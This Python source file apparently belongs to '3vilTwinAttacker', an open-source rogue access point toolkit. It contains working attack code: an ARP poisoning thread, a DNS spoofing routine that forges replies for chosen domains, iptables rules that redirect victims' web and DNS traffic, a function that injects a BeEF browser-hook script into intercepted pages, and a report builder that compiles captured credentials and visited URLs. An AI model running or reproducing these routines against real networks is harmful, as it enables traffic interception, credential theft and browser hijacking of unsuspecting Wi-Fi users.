#The MIT License (MIT)
#Copyright (c) 2015-2016 mh4x0f P0cL4bs Team
#Permission is hereby granted, free of charge, to any person obtaining a copy of
#this software and associated documentation files (the "Software"), to deal in
#the Software without restriction, including without limitation the rights to
#use, copy, modify, merge, publish, distribute, sublicense, and/or sell copies of
#the Software, and to permit persons to whom the Software is furnished to do so,
#subject to the following conditions:
#The above copyright notice and this permission notice shall be included in all
#copies or substantial portions of the Software.
#THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
#IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY, FITNESS
#FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE AUTHORS OR
#COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER LIABILITY, WHETHER
#IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM, OUT OF OR IN
#CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE SOFTWARE.
from struct import pack
from fcntl import ioctl
from time import sleep,asctime
from random import randint
from os import popen,path,walk,system,getpid
from BeautifulSoup import BeautifulSoup
from subprocess import call,check_output,Popen,PIPE,STDOUT
from re import search,compile,VERBOSE,IGNORECASE
import socket
try:
    from nmap import PortScanner
except ImportError:
    pass
import threading
from threading import Thread
from Queue import Queue, Empty
from scapy.all import *
from PyQt4.QtCore import *
from PyQt4.QtGui import *
import logging
def airdump_start(interface):
    process = ProcessThread(['xterm',
                '-geometry', '85x15-1+250', '-T',
            '"Scan AP Airodump-ng"', '-e', 'airodump-ng', interface,
        '--write', 'Settings/Dump/networkdump'])
    process.name = "Airodump-ng scan"
    process.start()
    process.join()
    return None

def Beef_Hook_url(html,hook_url):
    soup = BeautifulSoup(html)
    try:
        for link_tag in soup.findAll('body'):
            link_tag_idx = link_tag.parent.contents.index(link_tag)
            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup(hook_url))
            link_tag.parent.insert(link_tag_idx + 1, BeautifulSoup("<br>"))
            return soup
    except:
        return None

def get_network_scan():
    list_scan = []
    try:
        xml = BeautifulSoup(open("Settings/Dump/networkdump-01.kismet.netxml", 'r').read())
        for network in xml.findAll('wireless-network'):
                essid = network.find('essid').text
                if not essid:
                    essid = 'Hidden'
                channel = network.find('channel').text
                bssid = network.find('bssid').text
                list_scan.append(channel + "||" + essid + "||" + bssid)
        popen("rm Settings/Dump/networkdump*")
        return list_scan
    except IOError:
        return None


class ThreadScan(QThread):
    def __init__(self,gateway):
        QThread.__init__(self)
        self.gateway = gateway
        self.result = ''
    def run(self):
        nm = PortScanner()
        a=nm.scan(hosts=self.gateway, arguments='-sU --script nbstat.nse -O -p137')
        for k,v in a['scan'].iteritems():
            if str(v['status']['state']) == 'up':
                try:
                    ip = str(v['addresses']['ipv4'])
                    hostname = str(v['hostscript'][0]['output']).split(',')[0]
                    hostname = hostname.split(':')[1]
                    mac = str(v['hostscript'][0]['output']).split(',')[2]
                    if search('<unknown>',mac):mac = '<unknown>'
                    else:mac = mac[13:32]
                    self.result = ip +'|'+mac.replace('\n','')+'|'+hostname.replace('\n','')
                    self.emit(SIGNAL('Activated( QString )'),
                    self.result)
                except :
                    pass

class set_monitor_mode(QDialog):
    def __init__(self,interface,parent = None):
        super(set_monitor_mode, self).__init__(parent)
        self.interface = interface
    def setEnable(self):
        try:
            output  = check_output(['ifconfig', self.interface, 'down'])
            output += check_output(['iwconfig', self.interface, 'mode','monitor'])
            output += check_output(['ifconfig', self.interface, 'up'])
            if len(output) > 0:QMessageBox.information(self,'Monitor Mode',
            'device %s.%s'%(self.interface,output))
            return self.interface
        except Exception ,e:
            QMessageBox.information(self,'Monitor Mode',
            'mode on device %s.your card not supports monitor mode'%(self.interface))
    def setDisable(self):
        Popen(['ifconfig', self.interface, 'down'])
        Popen(['iwconfig', self.interface, 'mode','managed'])
        Popen(['ifconfig', self.interface, 'up'])

class ProcessThread(threading.Thread):
    def __init__(self,cmd):
        threading.Thread.__init__(self)
        self.cmd = cmd
        self.iface = None
        self.process = None
        self.logger = False

    def run(self):
        print 'Starting Thread:' + self.name
        if self.name == 'Airbase-ng':
            setup_logger('airbase', './Logs/requestAP.log')
            log_airbase = logging.getLogger('airbase')
            log_airbase.info('---[ Start Airbase-ng '+asctime()+']---')
            log_airbase.info('-'*52)
            self.logger = True
        self.process = Popen(self.cmd,stdout=PIPE,stderr=STDOUT)
        for line in iter(self.process.stdout.readline, b''):
            if self.logger:
                if search('Created tap interface',line):
                    Popen(['ifconfig',line.split()[4], 'up'])
                    self.iface = line.split()[4]
                log_airbase.info(line.rstrip())
            print (line.rstrip())

    def stop(self):
        print 'Stop thread:' + self.name
        if self.process is not None:
            self.process.terminate()
            self.process = None

class ThARP_posion(threading.Thread):
    def __init__(self, srcAddress, dstAddress):
        threading.Thread.__init__(self)
        self.srcAddress = srcAddress
        self.dstAddress = dstAddress
        self.process = True
    def run(self):
        while self.process:
            send(ARP(op=2,
            pdst=self.dstAddress,
                    psrc=self.srcAddress),
                            verbose=False,count=3)
    def stop(self):
        self.process = False
        print 'Stop thread:' + self.name

class ThDnsSpoofAttack(QThread):
    def __init__(self,domains,interface,filter,verbose,redirect):
        QThread.__init__(self)
        self.target     = domains
        self.filter     = filter
        self.verbose    = verbose
        self.interface  = interface
        self.redirect   = redirect
        self.finished   = False
        self.desc       = ['Module DNS spoof Attack']

    def run(self):
        print 'Starting Thread:' + self.objectName()
        self.sniff()

    def ARP(self,target,gateway):
        while True:
            try:
                send(ARP(op=2,
                pdst=target,
                    psrc=gateway),
                        verbose=False, count=3)
                send(ARP(op=2,
                        pdst=gateway,
                psrc=target), verbose=False, count=3)
            except:
                pass

    def StartSpoof(self,q):
        while self.finished:
            sniff(iface = self.interface,
            count = 10, filter = self.filter, prn = lambda x : q.put(x))

    def sniff(self):
        q = Queue()
        sniffer = Thread(target =self.StartSpoof, args = (q,))
        sniffer.daemon = True
        sniffer.start()
        while (not self.finished):
            try:
                pkt = q.get(timeout = 1)
                self.Poisoning(pkt)
            except Empty:
              pass

    def Poisoning(self,packet):
        #this function coded by:Adastra
        #https://github.com/Adastra-thw/pyHacks/blob/master/MitmDnsSpoofingPoC.py
        if packet.haslayer(DNS) and packet.getlayer(DNS).qr == 0 and len(self.target) > 0:
            for targetDomain, ipAddressTarget in self.target.items():
                if packet.getlayer(DNS).qd.qname == targetDomain:
                    try:
                        requestIP = packet[IP]
                        requestUDP = packet[UDP]
                        requestDNS = packet[DNS]
                        requestDNSQR = packet[DNSQR]
                        responseIP = IP(src=requestIP.dst, dst=requestIP.src)
                        responseUDP = UDP(sport = requestUDP.dport, dport = requestUDP.sport)
                        responseDNSRR = DNSRR(rrname=packet.getlayer(DNS).qd.qname, rdata = ipAddressTarget)
                        responseDNS = DNS(qr=1,id=requestDNS.id, qd=requestDNSQR, an=responseDNSRR)
                        answer = responseIP/responseUDP/responseDNS
                        send(answer)
                    except:
                        pass
    def redirection(self):
        system("iptables --flush")
        system("iptables --zero")
        system("iptables --delete-chain")
        system("iptables -F -t nat")
        system('iptables -t nat -A PREROUTING -p udp --dport 53 -j NFQUEUE')
        system("iptables --append FORWARD --in-interface "+self.interface+" --jump ACCEPT")
        system("iptables --table nat --append POSTROUTING --out-interface "+self.interface+" --jump MASQUERADE")
        system("iptables -t nat -A PREROUTING -p tcp --dport 80 --jump DNAT --to-destination "+self.redirect)
        system("iptables -t nat -A PREROUTING -p tcp --dport 443 --jump DNAT --to-destination "+self.redirect)
        system("iptables -t nat -A PREROUTING -i "+self.interface+" -p udp --dport 53 -j DNAT --to "+self.redirect)
        system("iptables -t nat -A PREROUTING -i "+self.interface+" -p tcp --dport 53 -j DNAT --to "+self.redirect)

    def stop(self):
        print 'Stop Thread:' + self.objectName()
        self.finished = True
        self.emit(SIGNAL('Activated( QString )'),'finished')

'''http://stackoverflow.com/questions/17035077/python-logging-to-multiple-log-files-from-different-classes'''
def setup_logger(logger_name, log_file, level=logging.INFO):
    l = logging.getLogger(logger_name)
    formatter = logging.Formatter('%(asctime)s : %(message)s')
    fileHandler = logging.FileHandler(log_file, mode='a')
    fileHandler.setFormatter(formatter)
    streamHandler = logging.StreamHandler()
    streamHandler.setFormatter(formatter)

    l.setLevel(level)
    l.addHandler(fileHandler)
    l.addHandler(streamHandler)

class Refactor:

    @staticmethod
    def htmlContent(title):
        html = {'htmlheader':[
            '<html>',
            '<head>',
            '<title>'+title+'</title>',
            '<meta http-equiv="Content-Type" content="text/html; charset=utf-8">',
            '<style type="text/css">',
            '.ln { color: rgb(0,0,0); font-weight: normal; font-style: normal; }',
            '.s0 { color: rgb(128,128,128); }',
            '.s1 { color: rgb(169,183,198); }',
            '.s2 { color: rgb(204,120,50); font-weight: bold; }',
            '.s3 { color: rgb(204,120,50); }',
            '.s4 { color: rgb(165,194,97); }',
            '.s5 { color: rgb(104,151,187); }',
            '</style>',
            '</head>',
            '<BODY BGCOLOR="#2b2b2b">',
            '<TABLE CELLSPACING=0 CELLPADDING=5 COLS=1 WIDTH="100%" BGCOLOR="#C0C0C0" >',
            '<TR><TD><CENTER>',
            '<FONT FACE="Arial, Helvetica" COLOR="#000000">'+title+'</FONT>',
            '</center></TD></TR></TABLE>',
            '<pre>',
            ]
        }
        return html
    @staticmethod
    def exportHtml():
        readFile = {
         'dhcp':{'Logs/dhcp.log':[]},
         'urls':{'Logs/urls.log':[]},
         'credentials': {'Logs/credentials.log':[]},
         'requestAP':{'Logs/requestAP.log':[]}}
        for i in readFile.keys():
            for j in readFile[i]:
                with open(j,'r') as file:
                    readFile[i][j] = file.read()

        contenthtml = Refactor.htmlContent('3vilTwinAttacker Report')
        HTML = ''
        for i in contenthtml['htmlheader']:
            HTML += i+"\n"
        HTML += '</span><span class="s5">Report Generated at::</span><span class="s0">'+asctime()+'</span>\n'
        HTML += '</span><span class="s4">-----------------------------------</span><span class="s1">\n'
        HTML += '</span><span class="s2">--------[   DHCP Logger   ]--------</span><span class="s1">\n'
        HTML += readFile['dhcp']['Logs/dhcp.log']
        HTML += '</span><span class="s2">--------[   URLS Logger   ]--------</span><span class="s1">\n'
        HTML += readFile['urls']['Logs/urls.log']
        HTML += '</span><span class="s2">--------[   Creds Logger  ]--------</span><span class="s1">\n'
        HTML += readFile['credentials']['Logs/credentials.log']
        HTML += '</span><span class="s2">--------[   FakeAP Logger ]--------</span><span class="s1">\n'
        HTML += readFile['requestAP']['Logs/requestAP.log']
        HTML += '</span><span class="s4">-----------------------------------</span><span class="s1">\n'
        HTML += '</span></pre>\n'+'</body>\n'+'</html>\n'
        return HTML

    @staticmethod
    def set_ip_forward(value):
        with open('/proc/sys/net/ipv4/ip_forward', 'w') as file:
            file.write(str(value))
            file.close()
    '''
    http://stackoverflow.com/questions/159137/getting-mac-address
    '''
    @staticmethod
    def getHwAddr(ifname):
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        info = ioctl(s.fileno(), 0x8927,  pack('256s', ifname[:15]))
        return ':'.join(['%02x' % ord(char) for char in info[18:24]])

    @staticmethod
    def get_interfaces():
        interfaces = {'activated':None,'all':[],'gateway':None,'IPaddress':None}
        proc = Popen("ls -1 /sys/class/net",stdout=PIPE, shell=True)
        for i in proc.communicate()[0].split():
            interfaces['all'].append(i)
        output1 = popen('route | grep default').read().split()
        output2 = popen('/sbin/ip route | grep default').read().split()
        if (output2 and output1) != []:
            if output1 != []:interfaces['gateway'],interfaces['activated'] = output1[1],output1[7]
            elif output2 != []:
                if path.isfile('/sbin/ip'):
                    interfaces['gateway'],interfaces['activated'] = output2[2], output2[4]
            interfaces['IPaddress'] = Refactor.get_ip_local(interfaces['activated'])
        return interfaces

    @staticmethod
    def get_ip_local(card):
        if not card != None:
            get_interface = Refactor.get_interfaces()['activated']
            out = popen("ifconfig %s | grep 'Bcast'"%(get_interface)).read().split()
            for i in out:
                if search("end",i):
                    if len(out) > 0:
                        ip = out[2].split(":")
                        return ip[0]
            if len(out) > 0:
                ip = out[1].split(":")
                return ip[1]
        else:
            out = popen("ifconfig %s | grep 'Bcast'"%(card)).read().split()
            for i in out:
                if search("end",i):
                    if len(out) > 0:
                        ip = out[2].split(":")
                        return ip[0]
            if len(out) > 0:
                ip = out[1].split(":")
                return ip[1]
        return None

    @staticmethod
    def get_mac(host):
        fields = popen('grep "%s " /proc/net/arp' % host).read().split()
        if len(fields) == 6 and fields[3] != "00:00:00:00:00:00":
            return fields[3]
        else:
            return ' not detected'

    @staticmethod
    def get_interface_mac(device):
        result = check_output(["ifconfig", device], stderr=STDOUT, universal_newlines=True)
        m = search("(?<=HWaddr\\s)(.*)", result)
        if not hasattr(m, "group") or m.group(0) == None:
            return None
        return m.group(0).strip()

    @staticmethod
    def randomMacAddress(prefix):
        for _ in xrange(6-len(prefix)):
            prefix.append(randint(0x00, 0x7f))
        return ':'.join('%02x' % x for x in prefix)


    @staticmethod
    def check_is_mac(value):
        checked = compile(r"""(
         ^([0-9A-F]{2}[-]){5}([0-9A-F]{2})$
        |^([0-9A-F]{2}[:]){5}([0-9A-F]{2})$
        )""",VERBOSE|IGNORECASE)
        if checked.match(value) is None:return False
        else:
            return True
    @staticmethod
    def threadRoot(sudo_password):
        call(['sudo','-k'])
        p = Popen(['sudo', '-S','./3vilTwin-Attacker.py'], stdin=PIPE, stderr=PIPE,
        universal_newlines=True)
        waiter().start()
        p.communicate(str(sudo_password) + '\n')[1]

    @staticmethod
    def find(name, paths):
        for root, dirs, files in walk(paths):
            if name in files:
                return path.join(root, name)

class waiter(threading.Thread):
    def run(self):
        sleep(10)
        call(['kill','-9',str(getpid())])